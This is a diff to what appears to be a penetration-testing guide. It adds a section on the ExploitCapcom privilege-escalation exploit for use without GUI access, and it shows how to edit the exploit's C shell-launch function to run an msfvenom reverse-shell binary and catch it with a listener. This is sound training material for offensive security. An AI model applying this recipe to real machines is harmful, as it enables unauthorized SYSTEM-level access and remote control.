@@ -205,6 +205,42 @@ You can download exploits from [https://github.com/tandasat/ExploitCapcom](https
 
 ![](../../../.gitbook/assets/a12.png)
 
+### No Gui
+
+If we **do not have GUI access** to the target, we will have to modify the **`ExploitCapcom.cpp`** code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.
+
+Code: c
+
+```c
+// Launches a command shell process
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+
+The `CommandLine` string in this example would be changed to:
+
+Code: c
+
+```c
+ TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+
+We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.
+
 ### Auto
 
 You can use [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) to **automatically enable** the **privilege**, **create** the **registry key** under HKEY\_CURRENT\_USER and **execute NTLoadDriver** indicating the registry key that you want to create and the path to the driver:
